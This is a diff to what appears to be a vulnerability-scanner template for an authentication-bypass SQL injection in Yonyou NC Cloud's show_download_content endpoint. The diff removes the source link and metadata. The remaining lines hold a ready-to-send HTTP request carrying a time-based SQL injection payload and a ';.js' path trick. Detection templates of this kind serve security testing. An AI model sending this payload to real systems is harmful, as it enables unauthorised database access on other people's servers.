@@ -3,12 +3,8 @@ info:
   name: 用友NC Cloud show_download_content接口权限绕过存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/icuoo6r36a9dehbn'
+  description: ''
   tags: sqli,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: icuoo6r36a9dehbn
-    fofa: app="用友-NC-Cloud"
 http:
 - raw:
   - GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY'0:0:5'--+ HTTP/1.1
